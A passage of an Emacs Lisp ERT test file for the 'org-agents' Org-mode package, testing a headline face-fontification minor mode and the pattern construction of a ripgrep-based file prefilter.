                                   (org-agents-test--title-face "Local")))
                    ;; And a second pass says nothing new.
                    (font-lock-ensure)))))
      (setq msgs (cl-remove-if-not
                  (lambda (m) (string-match-p "no such face" m)) msgs))
      (should (= 1 (length msgs)))
      (should (string-match-p "STATUS" (car msgs)))
      (should (string-match-p "org-agents-test--nonesuch-face" (car msgs))))))

(ert-deftest org-agents-test-faces-a-face-spelled-nil-is-a-diagnostic ()
  "`:ATTR_FACES: happy nil' is named, not silently ignored.
`nil' is a plausible way to spell \"draw this one plainly\" and a
plausible leftover from an edit, and `intern' makes it the symbol nil --
so a clause requiring the mapping's cdr dropped it before `facep' ever
saw it.  MEASURED before the fix: no face and NO MESSAGE, where every
other unusable face name is named -- which is \"a registry that names
faces and silently draws nothing\", the one bug
`org-agents--faces-declared' says this section exists to prevent.

`t' in the same field is the control: it was always diagnosed, because
`(facep t)' is nil and the walk reached the report."
  (org-agents-test--with-attr-corpus "\
* MOOD
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: happy nil | sad t | cross org-warning
:END:
"
      '(("a.org" . "\
* Happy
:PROPERTIES:
:MOOD: happy
:END:
* Sad
:PROPERTIES:
:MOOD: sad
:END:
* Cross
:PROPERTIES:
:MOOD: cross
:END:
"))
    (let ((msgs (org-agents-test--messages
                  (org-agents-test--with-faces-buffer
                    (should (eq 'org-level-1
                                (org-agents-test--title-face "Happy")))
                    (should (eq 'org-level-1
                                (org-agents-test--title-face "Sad")))
                    ;; And the readable mapping in the same field still draws.
                    (should (equal '(org-warning org-level-1)
                                   (org-agents-test--title-face "Cross")))))))
      (setq msgs (cl-remove-if-not
                  (lambda (m) (string-match-p "no such face" m)) msgs))
      (should (= 2 (length msgs)))
      ;; Quoted per `text-quoting-style', so the face name alone is matched.
      (should (cl-find-if (lambda (m) (string-match-p "face: .nil.\\'" m)) msgs))
      (should (cl-find-if (lambda (m) (string-match-p "face: .t.\\'" m)) msgs)))))

(ert-deftest org-agents-test-faces-an-unreadable-attr-faces-is-said-once ()
  "An `:ATTR_FACES:' that does not parse is named once, by attribute.
Said by the READER, which runs at most once per edit to the registry --
which is the property this test is really about.  The consumer reads the
`:faces' key `org-agents--attr-declaration' stored and does not re-parse
`:ATTR_FACES:' itself, so a broken line costs one message across as many
fontifications as the buffer gets.  A matcher that parsed the registry
for itself would repeat it on every scroll.

`org-agents-test-attributes-faces-parsed-not-applied' pins the same
storage from the reader's side; this pins it from the consumer's.  And
the other attribute still faces, because a bad field costs its field."
  (org-agents-test--with-attr-corpus "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: active
:END:

* OWNER
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: ada bold
:END:
"
      '(("a.org" . "\
* One
:PROPERTIES:
:STATUS: active
:END:
* Two
:PROPERTIES:
:OWNER: ada
:END:
"))
    (let ((msgs (org-agents-test--messages
                  (org-agents-test--with-faces-buffer
                    (font-lock-ensure)
                    (should (eq 'org-level-1 (org-agents-test--title-face "One")))
                    (should (equal '(bold org-level-1)
                                   (org-agents-test--title-face "Two")))))))
      (setq msgs (cl-remove-if-not
                  (lambda (m) (string-match-p "unreadable :ATTR_FACES:" m)) msgs))
      (should (= 1 (length msgs)))
      (should (string-match-p "STATUS" (car msgs))))))

(ert-deftest org-agents-test-faces-a-dangling-prototype-is-said-once ()
  "Twenty entries naming one missing master cost one message.
`org-agents--prototype-warned''s own docstring already assigns this
obligation -- \"a caller that runs the resolver over many entries of its
own -- a fontifier, say -- inherits the obligation to bind it\" -- and
this is that caller.  MEASURED: unbound, twenty such entries produce
twenty messages, and they would be twenty messages PER REDISPLAY.

The table this mode binds it to outlives a region, so the count is one
across two whole-buffer fontifications rather than one per region."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      (list (cons "a.org"
                  (mapconcat
                   (lambda (i)
                     (format "* Entry %d\n:PROPERTIES:\n:PROTOTYPE: Nope\n:END:\n"
                             i))
                   (number-sequence 1 20) "")))
    (let ((msgs (org-agents-test--messages
                  (org-agents-test--with-faces-buffer
                    (font-lock-ensure)
                    ;; Each of them still resolves to the declared default,
                    ;; so the dangling reference costs a message and not a face.
                    (should (equal '(org-todo org-level-1)
                                   (org-agents-test--title-face "Entry 7")))))))
      (should (= 1 (length (cl-remove-if-not
                           (lambda (m) (string-match-p "no prototype" m))
                           msgs)))))))

(ert-deftest org-agents-test-faces-an-unresolvable-id-is-read-at-most-once ()
  "A `:PROTOTYPE: id:' nothing can resolve does not re-read a file per redisplay.
Two shapes of unresolvable, and each had its own cost.  An id `org-id'
knows no file for is not looked for at all -- the contract is the table's,
and `org-id-find-id-file' answers the CURRENT buffer's own file on a table
miss, so the read searched the follower's file and could only ever answer
by accident.  An id whose file the table names but does not hold -- a
renamed master, a stale `org-id-locations-file' -- is read once and the
MISS is cached, keyed on that file exactly as an answer is.

MEASURED before either: one such reference in a 285 KB buffer cost one
whole-file `org-agents--in-org-copy' on every fontification of the region
holding it, 11.8 ms against 0.4 ms for the same screenful without it --
inside redisplay, and again on every keystroke in that region."
  (let ((uuid "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"))
    (org-agents-test--with-attr-corpus org-agents-test--faces-registry
        `(("masters.org" . "* A master with no such id\n")
          ("a.org" . ,(concat "\
* Dangler
:PROPERTIES:
:PROTOTYPE: id:" uuid "
:END:
* Local
:PROPERTIES:
:STATUS: stalled
:END:
")))
      (with-current-buffer (find-file-noselect (funcall F "a.org"))
        (org-agents-faces-mode 1)
        ;; Read the registry before the counter, so the count is the id path.
        (font-lock-ensure (point-min) (point-min))
        (let ((copies 0))
          (cl-letf* ((orig (symbol-function 'org-agents--in-org-copy))
                     ((symbol-function 'org-agents--in-org-copy)
                      (lambda (&rest args)
                        (setq copies (1+ copies))
                        (apply orig args))))
            ;; Untracked: the table has no answer, so nothing is read.
            (should (org-agents--prototype-id-untracked-p uuid))
            (font-lock-ensure)
            (font-lock-ensure)
            (should (= 0 copies))
            ;; Tracked, and the file does not hold it: read once, missed once.
            (puthash uuid (funcall F "masters.org") org-id-locations)
            (setq org-agents--prototype-id-cache nil)
            (font-lock-ensure)
            (font-lock-ensure)
            (font-lock-ensure)
            (should (= 1 copies)))
          ;; Either way the entry is drawn from the declared default and the
          ;; rest of the buffer is faced.
          (should (equal '(org-todo org-level-1)
                         (org-agents-test--title-face "Dangler")))
          (should (equal '(org-warning org-level-1)
                         (org-agents-test--title-face "Local"))))))))

(ert-deftest org-agents-test-faces-a-diagnostic-is-re-said-after-an-edit ()
  "Fixing the registry is noticed; leaving it broken is not re-said.
The once-per-diagnostic table is keyed on the registry's own cache key,
which `org-agents--with-attributes' has just brought up to date -- so a
table made against it is a table made against the declarations now in
force.  Keyed on the buffer alone, the fix below would never be noticed
and the user would go on seeing an unfaced headline with no message to
say why.

The registry is edited in a BUFFER and not saved, because that is the
edit `org-agents--file-cache-key' invalidates on reliably: with a buffer
visiting the file the key carries `buffer-chars-modified-tick', where an
unvisited file offers only a modification time and a size."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (let ((broken (lambda (msgs)
                    (length (cl-remove-if-not
                             (lambda (m) (string-match-p "no such face" m))
                             msgs)))))
      ;; Not `org-agents-test--with-faces-buffer': its own fontification
      ;; would say the first message outside the capture below.
      (with-current-buffer (find-file-noselect (car files))
        (org-agents-faces-mode 1)
        ;; Said once, and not again while the registry says the same thing.
        (should (= 1 (funcall broken (org-agents-test--messages
                                       (font-lock-ensure)
                                       (font-lock-ensure)))))
        (should (eq 'org-level-1 (org-agents-test--title-face "Typo")))
        ;; Fix the face name.  The entry is faced, and nothing is said.
        (with-current-buffer (find-file-noselect registry)
          (goto-char (point-min))
          (should (search-forward "org-agents-test--nonesuch-face" nil t))
          (replace-match "org-done" t t))
        (should (= 0 (funcall broken (org-agents-test--messages
                                       (font-lock-ensure)))))
        (should (equal '(org-done org-level-1)
                       (org-agents-test--title-face "Typo")))
        ;; Break it again, and it is said once more.
        (with-current-buffer (find-file-noselect registry)
          (goto-char (point-min))
          (should (search-forward "org-done" nil t))
          (replace-match "org-agents-test--nonesuch-face" t t))
        (should (= 1 (funcall broken (org-agents-test--messages
                                       (font-lock-ensure)))))))))

(ert-deftest org-agents-test-faces-never-signal-out-of-a-matcher ()
  "An error inside the resolution is reported, not raised.
`org-agents-resolve-property-quietly' demotes a `user-error' and nothing
else, and an `error' escaping a font-lock matcher reaches redisplay --
where Emacs turns the offending keyword off for the rest of the session
and the user gets a buffer that has silently stopped following its
attributes.  So the per-headline resolution wears a `condition-case'
belt, reporting through the same once-per-key table rather than through
`with-demoted-errors', which would message per occurrence.

The rest of the buffer still fontifies: `org-level-1' is Org's own
keyword, and the belt is what keeps ours from taking Org's down with it."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (org-agents-faces-mode 1)
      (let ((msgs (org-agents-test--messages
                    (cl-letf (((symbol-function
                                'org-agents-resolve-property-quietly)
                               (lambda (&rest _)
                                 (error "org-agents-test: deliberate"))))
                      ;; No signal escapes, twice over.
                      (font-lock-ensure)
                      (font-lock-ensure)))))
        (should (eq 'org-level-1 (org-agents-test--title-face "Local")))
        (should (= 1 (length (cl-remove-if-not
                              (lambda (m) (string-match-p "deliberate" m))
                              msgs))))))))

(ert-deftest org-agents-test-faces-cost-scales-with-what-is-displayed ()
  "Fontifying a window costs a window's resolutions, not a buffer's.
This is what \"jit-lock-driven\" means as an assertion rather than as a
claim: the matcher reads only the entry at its match and honours its
LIMIT, so a four-hundred-entry corpus costs 5 resolutions to draw a
twelve-line window of it where the whole buffer costs 799.  A headline
outside the region carries no `face' property at all, which is the same
statement from the other side.

The whole-buffer half is what keeps the counter honest.  An
implementation that resolved through `org-agents-resolve-property'
directly, or that hoisted every resolution to mode-enable time, would
score zero on the narrow count and must not pass on that account.

`org-agents-test--faces-many' says why only one entry in it is drawn,
and it is the difference between this test discriminating and not."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      (org-agents-test--faces-many 400 205)
    (with-current-buffer (find-file-noselect (car files))
      (org-agents-faces-mode 1)
      (let ((resolves 0)
            narrow)
        (cl-letf* ((orig (symbol-function 'org-agents-resolve-property-quietly))
                   ((symbol-function 'org-agents-resolve-property-quietly)
                    (lambda (&rest args)
                      (setq resolves (1+ resolves))
                      (apply orig args))))
          ;; A window holding the drawn entry and three after it.
          (goto-char (point-min))
          (should (re-search-forward "^\\* Entry 205$" nil t))
          (let ((beg (line-beginning-position)))
            (forward-line 12)
            (font-lock-ensure beg (point)))
          (setq narrow resolves)
          (should (> narrow 0))
          (should (< narrow 30))
          ;; Drawn: inside the region.  Untouched: outside it.
          (should (equal '(org-warning org-level-1)
                         (org-agents-test--title-face "Entry 205")))
          (should-not (org-agents-test--title-face "Entry 5"))
          (should-not (org-agents-test--title-face "Entry 399"))
          (setq resolves 0)
          (font-lock-ensure (point-min) (point-max))
          (should (> resolves 700))
          (should (> resolves (* 10 narrow))))))))

(ert-deftest org-agents-test-faces-read-the-registry-once-per-region ()
  "One registry read per fontified region, however many headlines it holds.
`org-agents-resolve-property' reaches the registry, and cold that costs
`org-agents--file-cache-key' -- `file-truename' plus
`find-buffer-visiting', which walks the buffer list truenaming each
buffer's file.  MEASURED over the four-hundred-entry fixture: a
whole-buffer fontification costs 405 keys and 0.097 s with the batch
established per matcher CALL, and 1 key and 0.033 s with it established
once for the region, over an Org-alone baseline of 0.010 s.  The saving
grows with the buffer list, which on a working Emacs is hundreds of
buffers long.

That is what `org-agents--faces-fontify-region' exists for, and a font-lock
keyword cannot do it: a keyword has no extent over which to hold a dynamic
binding.  Please do not simplify it away -- and if you do, this test and
`org-agents-test-faces-a-dangling-prototype-is-said-once' are what will
tell you."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      (org-agents-test--faces-many 100 7)
    (with-current-buffer (find-file-noselect (car files))
      (org-agents-faces-mode 1)
      (let ((keys 0))
        (cl-letf* ((orig (symbol-function 'org-agents--file-cache-key))
                   ((symbol-function 'org-agents--file-cache-key)
                    (lambda (&rest args)
                      (setq keys (1+ keys))
                      (apply orig args))))
          (font-lock-ensure))
        (should (= 1 keys))))))

(ert-deftest org-agents-test-faces-with-no-registry-consult-nothing ()
  "No registry declares no faces, and nothing is resolved or said.
The global variant arms every Org buffer, so this is the case most users
are in most of the time and it has to cost nothing measurable: the
matcher answers nil before it resolves anything at all, and there is no
message about a file that is not there."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      '(("a.org" . "* One\n* Two\n* Three\n"))
    (let ((org-agents-attributes-file
           (expand-file-name "no-such-registry.org" dir))
          (org-agents--attributes-cache nil)
          (org-agents--prototypes-cache nil)
          (resolves 0))
      (with-current-buffer (find-file-noselect (car files))
        (org-agents-faces-mode 1)
        (let ((msgs (org-agents-test--messages
                      (cl-letf* ((orig (symbol-function
                                        'org-agents-resolve-property-quietly))
                                 ((symbol-function
                                   'org-agents-resolve-property-quietly)
                                  (lambda (&rest args)
                                    (setq resolves (1+ resolves))
                                    (apply orig args))))
                        (font-lock-ensure)))))
          (should (= 0 resolves))
          (should-not msgs)
          (should (eq 'org-level-1 (org-agents-test--title-face "One")))
          (should (eq 'org-level-1 (org-agents-test--title-face "Three"))))))))

(ert-deftest org-agents-test-faces-change-no-bytes ()
  "Enabling, fontifying and disabling writes nothing whatever.
The epic's headline claim, and the guard against action code arriving
through the appearance door: an appearance declaration that could set a
tag or a TODO state would be inheritable behaviour, which is what
`docs/research/action-code-safety.md' part 3 says makes per-file trust
meaningless.
So the writers are watched by name, and every other way of noticing a
write is asserted beside them -- the modification flag, the character
tick, the text itself, the file's bytes, and the absence of any overlay,
since an overlay is the other way a package changes an appearance and
this one does not use it.

The registry is read once BEFORE the tripwire goes up, deliberately.
`org-agents--in-org-copy' inserts the registry's text into a temporary
buffer of its own making, and that is this package writing into its own
scratch space rather than into the user's file -- but it is still a call
to `insert', and a tripwire that caught it would be reporting the wrong
thing."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (let ((before (org-agents-test--file-text (car files))))
      (with-current-buffer (find-file-noselect (car files))
        (org-agents--with-attributes nil)
        (let ((text (buffer-substring-no-properties (point-min) (point-max)))
              (tick (buffer-chars-modified-tick))
              (org-agents-test--tripwire-count 0))
          (cl-letf (((symbol-function 'insert) #'org-agents-test--tripwire)
                    ((symbol-function 'delete-region)
                     #'org-agents-test--tripwire)
                    ((symbol-function 'org-entry-put)
                     #'org-agents-test--tripwire)
                    ((symbol-function 'replace-buffer-contents)
                     #'org-agents-test--tripwire))
            (org-agents-faces-mode 1)
            (font-lock-ensure)
            (org-agents-faces-mode -1)
            (font-lock-ensure))
          (should (= 0 org-agents-test--tripwire-count))
          (should-not (buffer-modified-p))
          (should (= tick (buffer-chars-modified-tick)))
          (should (equal text (buffer-substring-no-properties (point-min)
                                                              (point-max))))
          (should-not (overlays-in (point-min) (point-max)))))
      (should (equal before (org-agents-test--file-text (car files)))))))

(ert-deftest org-agents-test-faces-disabling-leaves-no-residue ()
  "Turning the mode off puts the buffer back exactly as it was.
Nothing here removes a text property.  The mode un-declares its keyword
and lets font-lock's own unfontify pass take the face off, which is the
whole mechanism: `font-lock-default-fontify-region' unfontifies before it
fontifies, and `font-lock-flush' is what marks the region for that to
happen.  So \"no residue\" is four separate assertions -- the keyword
list is `equal' to what it was, our buffer-local variables are gone, the
face is gone after a refontification, and the text never moved.

`font-lock-remove-keywords' removes by `equal', which is why
`org-agents--faces-keywords' is a `defconst' holding no value that
depends on an option: a keyword form built from
`org-fontify-whole-heading-line' would fail to remove if the option
changed between the two calls.  MEASURED, the nil-MODE path also leaves
no record in `font-lock-removed-keywords-alist'.

In batch `font-lock-flush' is a no-op -- both of its guards fail -- so
the assertion after the disable has to force the refontification itself.
`org-agents-test-faces-flush-reaches-jit-lock' is where the flush is
tested for what it does interactively."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (font-lock-set-defaults)
      (let ((keywords (copy-tree font-lock-keywords)))
        (org-agents-faces-mode 1)
        (font-lock-ensure)
        (should (equal '(org-warning org-level-1)
                       (org-agents-test--title-face "Local")))
        (should-not (equal keywords font-lock-keywords))
        (org-agents-faces-mode -1)
        (should (equal keywords font-lock-keywords))
        (should-not (local-variable-p 'font-lock-fontify-region-function))
        ;; Org's own extension is handed back, and it was local before us.
        (should (eq font-lock-extend-after-change-region-function
                    #'org-fontify-extend-region))
        (should-not (local-variable-p 'org-agents--faces-outer-fontify))
        (should-not (local-variable-p 'org-agents--faces-outer-local))
        (should-not (local-variable-p 'org-agents--faces-outer-extend))
        (should-not (local-variable-p 'org-agents--faces-outer-extend-local))
        (should-not (local-variable-p 'org-agents--faces-warned))
        (should-not font-lock-removed-keywords-alist)
        (font-lock-ensure)
        (should (eq 'org-level-1 (org-agents-test--title-face "Local")))
        (should-not (overlays-in (point-min) (point-max)))))))

(ert-deftest org-agents-test-faces-disabling-restores-a-wrapped-region-function ()
  "A `font-lock-fontify-region-function' another mode set is given back.
An Org buffer does not make that variable buffer-local -- MEASURED, only
`font-lock-unfontify-region-function' -- so the ordinary restore is
`kill-local-variable'.  But another mode may have localized it first, and
MEASURED, an unconditional `kill-local-variable' loses that mode's value
for good.  Hence the two records: what the value was, and whether it was
already local.

The `eq' guard is the other half, and it is what keeps a mode layered on
TOP of ours from being clobbered when ours goes off first: a restore that
did not check whose function is installed would overwrite the outer one."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (setq-local font-lock-fontify-region-function
                  #'org-agents-test--faces-sentinel-region)
      (org-agents-faces-mode 1)
      (should (eq font-lock-fontify-region-function
                  #'org-agents--faces-fontify-region))
      ;; And the sentinel is still what actually fontifies, underneath.
      (font-lock-ensure)
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local")))
      (org-agents-faces-mode -1)
      (should (eq font-lock-fontify-region-function
                  #'org-agents-test--faces-sentinel-region))
      (should (local-variable-p 'font-lock-fontify-region-function)))))

(defun org-agents-test--faces-sentinel-region (beg end &optional loudly)
  "Stand in for another mode's `font-lock-fontify-region-function'.
It fontifies, so that the test can assert the wrap CALLS what it wrapped
rather than merely recording it."
  (font-lock-default-fontify-region beg end loudly))

(ert-deftest org-agents-test-faces-a-second-enable-changes-nothing ()
  "Enabling the mode twice leaves one wrap, and fontification still works.
`define-minor-mode' runs the enable body on every `(mode 1)', and two
enables reach one buffer through the two configurations
docs/init-snippet.org recommends side by side: `global-org-agents-faces-mode'
arms the buffer, and a file-local `mode: org-agents-faces' then asks for
it again.  MEASURED before the guard: the second pass found
`font-lock-fontify-region-function' local BECAUSE THE FIRST MADE IT LOCAL
and recorded OUR function as the outer one, so
`org-agents--faces-fontify-region' funcalled itself --
`excessive-lisp-nesting' out of the first fontification, and under real
jit-lock every headline left with NO face at all, Org's `org-level-N'
included, with jit-lock's `fontified' property already stamped so nothing
retried.

Three assertions, and the first is the one that failed: no signal and the
right face; nothing recorded as an outer function; and a single disable
puts the buffer back, where before it left our own function installed
buffer-locally with the mode off."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (org-agents-faces-mode 1)
      (org-agents-faces-mode 1)
      ;; The signal first, because it is the symptom: MEASURED,
      ;; `(excessive-lisp-nesting 1601)' out of this call.
      (font-lock-ensure)
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local")))
      (should-not org-agents--faces-outer-fontify)
      (should-not org-agents--faces-outer-local)
      (should-not (eq org-agents--faces-outer-extend
                      #'org-agents--faces-extend-region))
      (org-agents-faces-mode -1)
      (should-not (local-variable-p 'font-lock-fontify-region-function))
      (should (eq font-lock-extend-after-change-region-function
                  #'org-fontify-extend-region))
      ;; And a third cycle after that is still clean.
      (org-agents-faces-mode 1)
      (font-lock-ensure)
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local"))))))

(ert-deftest org-agents-test-faces-a-second-enable-keeps-a-wrapped-function ()
  "Two enables over another mode's region function still give it back.
The other half of `org-agents-test-faces-a-second-enable-changes-nothing',
and the half a reader is likelier to get wrong: MEASURED before the
guard, the second enable overwrote the sentinel record with our own
function, so the disable handed back `org-agents--faces-fontify-region'
and the sentinel was lost for good."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (setq-local font-lock-fontify-region-function
                  #'org-agents-test--faces-sentinel-region)
      (org-agents-faces-mode 1)
      (org-agents-faces-mode 1)
      (should (eq org-agents--faces-outer-fontify
                  #'org-agents-test--faces-sentinel-region))
      (font-lock-ensure)
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local")))
      (org-agents-faces-mode -1)
      (should (eq font-lock-fontify-region-function
                  #'org-agents-test--faces-sentinel-region)))))

(ert-deftest org-agents-test-faces-mode-refuses-a-non-org-buffer ()
  "There are no attributes outside Org, and the mode says so rather than arm.
Off afterwards as well, and with nothing installed: `define-minor-mode'
sets the variable before the body runs, so a refusal that only signaled
would leave a mode reporting itself enabled with no keyword behind it.
`org-agents-mode' is refused the same way, for the same reason."
  (with-temp-buffer
    (fundamental-mode)
    (let ((keywords font-lock-keywords))
      (should-error (org-agents-faces-mode 1) :type 'user-error)
      (should-not org-agents-faces-mode)
      (should (equal keywords font-lock-keywords))
      (should-not (local-variable-p 'font-lock-fontify-region-function)))))

(ert-deftest org-agents-test-faces-global-arms-every-org-buffer ()
  "The global variant arms an Org buffer whose text mentions no property.
Deliberately UNLIKE `global-org-agents-mode', whose predicate is a text
scan for `:AGENT_QUERY:'.  The values this mode draws from arrive through
a `:PROTOTYPE:' chain or out of `:ATTR_DEFAULT:', and an entry faced that
way spells NOTHING AT ALL -- \"grep does not see an inherited value\", and
neither would a turn-on predicate that grepped.  So the buffer below,
whose whole content is one bare headline, is the case a text scan would
miss and is exactly the case the mode exists for.

Affordable because measured: with no registry the apparatus costs a
regexp scan of the displayed region and nothing else, which is what
`org-agents-test-faces-with-no-registry-consult-nothing' asserts.

A buffer that is not Org is passed over silently rather than refused: the
mode's own refusal is for a user who asked for it by name."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      '(("bare.org" . "* Nothing at all\n"))
    (let ((plain (expand-file-name "plain.txt" dir)))
      (with-temp-file plain (insert "not org at all\n"))
      (global-org-agents-faces-mode 1)
      (unwind-protect
          (progn
            (with-current-buffer (find-file-noselect (car files))
              (should org-agents-faces-mode)
              (font-lock-ensure)
              (should (equal '(org-todo org-level-1)
                             (org-agents-test--title-face "Nothing at all"))))
            (with-current-buffer (find-file-noselect plain)
              (should-not org-agents-faces-mode)))
        (global-org-agents-faces-mode -1))
      ;; Turning it off disarms what it armed.
      (with-current-buffer (find-file-noselect (car files))
        (should-not org-agents-faces-mode)))))

(ert-deftest org-agents-test-faces-flush-reaches-jit-lock ()
  "The real jit-lock path: enabling and disabling both refresh the buffer.
The one test here that reaches `font-lock-mode' proper, and it has to
work for it.  A buffer whose name does not begin with a space, and
`noninteractive' bound to nil for the length of the call, is what gets
past the two refusals -- MEASURED, that yields `font-lock-mode' t,
`jit-lock-mode' t and `font-lock-flush-function' `jit-lock-refontify',
which is the function that does the work interactively.
`with-temp-buffer' cannot be used: its buffer is named \" *temp*\".

The buffer is fontified BEFORE the mode is enabled, on purpose.  That is
what makes this a test of `font-lock-flush': with the region already
carrying jit-lock's `fontified' property, `jit-lock-fontify-now' skips it
unless something has cleared it, so a mode that added its keyword without
flushing would leave the buffer looking exactly as it did before -- and a
mode that removed its keyword without flushing would leave the face on
the screen after being turned off."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (let ((noninteractive nil))
        (font-lock-mode 1))
      (should font-lock-mode)
      (should (eq font-lock-flush-function #'jit-lock-refontify))
      (font-lock-ensure)
      (should (eq 'org-level-1 (org-agents-test--title-face "Local")))
      (org-agents-faces-mode 1)
      (font-lock-ensure)
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local")))
      (org-agents-faces-mode -1)
      (font-lock-ensure)
      (should (eq 'org-level-1 (org-agents-test--title-face "Local"))))))

(ert-deftest org-agents-test-faces-an-edit-to-the-value-redraws-the-headline ()
  "Changing the value in the drawer moves the face on the headline above it.
The interaction the mode exists to support, and it needs a hook of its
own: the face is on the headline, the value is in the drawer under it, and
`jit-lock-after-change' clears the `fontified' property over the CHANGED
line only.  MEASURED without
`org-agents--faces-extend-region': after replacing `:STATUS: stalled' with
`:STATUS: active' the headline still read `(org-warning org-level-1)'
after a whole-buffer `jit-lock-fontify-now', and only an explicit
`font-lock-flush' moved it -- a display asserting a value the drawer no
longer held.

The real jit-lock path, as `org-agents-test-faces-flush-reaches-jit-lock'
reaches it and for the same reason: `after-change-functions' has nothing
of font-lock's in it until `font-lock-mode' is really on, so a
`font-lock-ensure' test here would pass without the hook and assert
nothing."
  (org-agents-test--with-attr-corpus org-agents-test--faces-registry
      org-agents-test--faces-corpus
    (with-current-buffer (find-file-noselect (car files))
      (let ((noninteractive nil))
        (font-lock-mode 1))
      (should font-lock-mode)
      (should jit-lock-mode)
      (org-agents-faces-mode 1)
      (jit-lock-fontify-now (point-min) (point-max))
      (should (equal '(org-warning org-level-1)
                     (org-agents-test--title-face "Local")))
      ;; `stalled' becomes `active', whose face is `org-todo'.
      (goto-char (point-min))
      (should (search-forward ":STATUS: stalled" nil t))
      (replace-match ":STATUS: active" t t)
      (jit-lock-fontify-now (point-min) (point-max))
      (should (equal '(org-todo org-level-1)
                     (org-agents-test--title-face "Local")))
      ;; And Org's own fontification of the changed region survives the wrap.
      (should (eq 'org-level-1
                  (org-agents-test--title-face "Unmapped")))
      (set-buffer-modified-p nil))))

;;;; Prefilter (ripgrep)

;; The prefilter chooses which FILES org-ql opens, so it can never change
;; an answer -- unless it narrows too far, in which case matches vanish
;; with no error at all.  Everything in this section exists to make that
;; impossible, and it divides in two.
;;
;; The soundness tests below the fixture assert the invariant end to end:
;; for a query Q over a scope's base files, the candidate set must cover
;; every file org-ql's OWN matches came from.  The left-hand side of that
;; assertion never asks the prefilter anything -- it runs `org-ql-select'
;; over the whole base set, enumerated with `directory-files-recursively'
;; rather than read out of the fixture's manifest -- so a bug in the
;; prefilter cannot influence it.
;;
;; The unit tests above the fixture cover pattern construction, the
;; argument vector and the exit-status contract with no subprocess at
;; all, because that is where every under-match this backend was measured
;; to have originates: a missing flag, a missing `\+?', an Emacs
;; `regexp-quote' where a Rust one was wanted.

(ert-deftest org-agents-test-rg-quote-escapes-the-rust-dialect ()
  "Exactly the 18 characters `regex_syntax::escape' escapes, and no others.
Escaping more is not merely redundant, it is wrong: `\\<' is a word-start
ASSERTION to the Rust regex crate, so escaping a `<' changes the
pattern's meaning instead of protecting it."
  (dolist (c (string-to-list "\\.+*?()|[]{}^$#&-~"))
    (should (equal (org-agents--rg-quote (format "a%cb" c))
                   (format "a\\%cb" c))))
  (dolist (c (string-to-list "<>%_:=,!\"/ 0aZ"))
    (should (equal (org-agents--rg-quote (format "a%cb" c))
                   (format "a%cb" c))))
  ;; The measured hazard: Emacs spells a group `\\(', so `regexp-quote'
  ;; leaves a bare `(' alone and rg reads it as grouping.
  (should (equal (regexp-quote "Review (draft)") "Review (draft)"))
  (should (equal (org-agents--rg-quote "Review (draft)")
                 "Review \\(draft\\)")))

(ert-deftest org-agents-test-rg-quote-strips-text-properties ()
  "A literal lifted out of an Org buffer carries properties.
This is the one place a literal becomes something a subprocess sees, so
it is the one place they are dropped."
  (let ((quoted (org-agents--rg-quote (propertize "Review" 'face 'bold))))
    (should (equal quoted "Review"))
    (should (null (text-properties-at 0 quoted)))))

(ert-deftest org-agents-test-rg-patterns-are-printable-ascii ()
  "A non-ASCII literal is not pushed, and no pattern carries one.
rg decodes as UTF-8; Emacs may decode an Org file as latin-1 through a
coding cookie or `file-coding-system-alist'.  Measured: a latin-1 file
holding `* Cafe\\301 Review' does not match the UTF-8 pattern `Cafe\\301'
while it does match `Caf'.  No flag fixes that -- `--encoding' is global
and a corpus is mixed -- so a non-ASCII literal is refused."
  (let ((org-use-property-inheritance nil))
    (dolist (conjunct '((heading "Caf\351")
                        (heading "Caf\351" "Review")
                        (property "CODE" "caf\351")
                        (property "CAF\351")))
      (dolist (pattern (org-agents--rg-patterns conjunct))
        (should (equal pattern (encode-coding-string pattern 'us-ascii)))))
    ;; Refused outright, not silently turned into something else.
    (should (null (org-agents--rg-patterns '(heading "Caf\351"))))
    ;; The name is refused as well, and with it the whole conjunct.
    (should (null (org-agents--rg-patterns '(property "CAF\351"))))
    ;; A non-ASCII VALUE downgrades to the existence pattern, which is
    ;; wider and therefore sound.
    (should (equal (org-agents--rg-patterns '(property "CODE" "caf\351"))
                   '("^[ \\t]*:CODE\\+?:")))
    ;; And a newline, a tab and the empty literal push nothing.
    (should (null (org-agents--rg-patterns '(heading "a\nb"))))
    (should (null (org-agents--rg-patterns '(heading "a\tb"))))
    (should (null (org-agents--rg-patterns '(heading ""))))))

(ert-deftest org-agents-test-rg-patterns-property ()
  "The property patterns, spelled out, because each character was measured."
  (let ((org-use-property-inheritance nil))
    ;; `\+?' admits the accumulating spelling: an entry whose ONLY line is
    ;; `:P+: v' answers `org-entry-get' with \"v\", so a pattern anchored
    ;; on `:P:' misses the file -- the unsound direction.
